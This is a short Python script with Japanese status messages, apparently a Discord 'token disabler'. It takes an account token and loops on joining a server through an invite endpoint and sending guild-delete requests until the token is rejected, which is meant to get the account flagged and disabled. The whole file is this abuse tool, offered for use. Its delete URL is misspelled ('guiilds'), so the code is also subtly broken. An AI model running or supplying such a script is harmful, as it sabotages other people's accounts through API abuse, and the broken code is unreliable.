import requests
import sys

token = input("Token: ")
print("無効化中")

while True:
    response = requests.post("https://discordapp.com/api/v6/invite/mee6", headers={"Authorization": token})
    if response.status_code == 401:
        break
    guild_id = response.json()["guild"]["id"]
    response = requests.delete(f"https://discordapp.com/api/v6/guiilds/{guild_id}", headers={"Authorization": token})
    if response.status_code == 401:
        break
print("無効化完了")
try:
    sys.exit()
except SystemExit:
    pass